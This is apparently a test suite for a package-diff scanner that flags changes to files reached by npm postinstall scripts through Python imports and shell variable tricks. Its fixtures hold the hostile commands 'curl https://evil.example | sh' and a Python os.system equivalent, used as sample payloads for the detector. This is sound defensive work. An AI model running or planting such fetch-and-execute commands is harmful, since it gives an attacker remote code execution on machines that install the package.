import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const sh = "curl https://evil.example | sh\n";
const py = "import os\nos.system('curl evil|sh')\n";
const pyc = "\x00\x00\x00\x00junk";

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

const pyE = (body: string, f: string, extra: Record<string, string> = {}) => ({
  "package.json": pj({ postinstall: "python3 install.py" }),
  "install.py": body,
  [f]: "true\n",
  "README.md": "a\n",
  ...extra,
});
const shE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "sh install.sh" }),
  "install.sh": body,
  [f]: "true\n",
  "README.md": "a\n",
});

// An import after a colon, and a literal __import__ or import_module, close the
// same shadow files as `import X`. A command word with $ and no literal directory
// widens. `from . import` is not a top-level module.
const cases: [string, Record<string, string>, string, string, boolean][] = [
  ["O1 py unlisted stdlib .pyc", pyE("import secrets\nprint(1)\n", "secrets.pyc"), "secrets.pyc", pyc, false],
  ["O2 py unlisted stdlib dir", pyE("import operator\nprint(1)\n", "operator/__init__.py"), "operator/__init__.py", py, false],
  ["O3 py unlisted stdlib .so", pyE("import select\nprint(1)\n", "select.abi3.so"), "select.abi3.so", "\x7fELFjunk", false],
  ["O4 py third-party .pyc", pyE("import requests\nprint(1)\n", "requests.pyc"), "requests.pyc", pyc, false],
  ["O5 py third-party dir", pyE("import yaml\nprint(1)\n", "yaml/__init__.py"), "yaml/__init__.py", py, false],
  ["O6 py local module .pyc", pyE("import helper\nprint(1)\n", "helper.pyc"), "helper.pyc", pyc, false],
  ["O7 py import after colon", pyE("try: import json\nexcept Exception: pass\n", "json.pyc"), "json.pyc", pyc, true],
  ["O8 py import backslash continuation", pyE("import \\\n    json\nprint(1)\n", "json.pyc"), "json.pyc", pyc, false],
  ["O9 py import inside if", pyE("if True: import json\n", "json/__init__.py"), "json/__init__.py", py, true],
  ["O11 py __import__ literal", pyE("__import__('json')\n", "json.pyc"), "json.pyc", pyc, true],
  ["O12 py import_module literal", pyE("import importlib\nimportlib.import_module('secrets')\n", "secrets.pyc"), "secrets.pyc", pyc, true],
  ["O13 sh positional $1", shE("set -- docs/run.sh\n\"$1\"\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["O14 sh $@", shE("set -- docs/run.sh\n\"$@\"\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["O15 sh ${X:-default}", shE("${X:-docs/run.sh}\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["O16 sh $D/run.sh", shE("D=docs\n$D/run.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["O17 sh $X$Y", shE("X=docs/\nY=run.sh\n$X$Y\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["O18 sh ${X%.x}", shE("X=docs/run.sh.x\n${X%.x}\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["O19 sh exec $X", shE("X=docs/run.sh\nexec $X\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["O20 sh command $X", shE("X=docs/run.sh\ncommand $X\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["O21 sh nohup $X", shE("X=docs/run.sh\nnohup $X\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["O22 sh eval $X", shE("X=docs/run.sh\neval \"$X\"\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["O23 sh for loop glob", shE("for f in docs/*.sh; do \"$f\"; done\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["O24 sh ANSI-C quote", shE("$'docs/run.sh'\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["O25 sh glob command word", shE("docs/r*.sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["O26 sh $X after &&", shE("X=docs/run.sh\ntrue && $X\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["O27 sh time $X", shE("X=docs/run.sh\ntime $X\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["O9 else import", pyE("if False: pass\nelse: import json\n", "json.pyc"), "json.pyc", pyc, true],
];

for (const [name, base, file, bad, readmeQuiet] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    holds(base, file, bad);
    const readme = hard(base, { ...base, "README.md": "b\n" });
    if (readmeQuiet) expect(readme).toEqual([]);
    else expect(readme.join(" ")).toMatch(/README\.md/);
  });
}

test("O10 relative from-import is not a module beside the script", () => {
  const base = pyE("from . import evil\n", "evil.py");
  expect(hard(base, { ...base, "evil.py": py })).toEqual([]);
});

test("a variable __import__ reaches every file", () => {
  const base = pyE("__import__(name)\n", "json.pyc");
  holds(base, "json.pyc", pyc);
  expect(hard(base, { ...base, "README.md": "b\n" }).join(" ")).toMatch(/README\.md/);
});
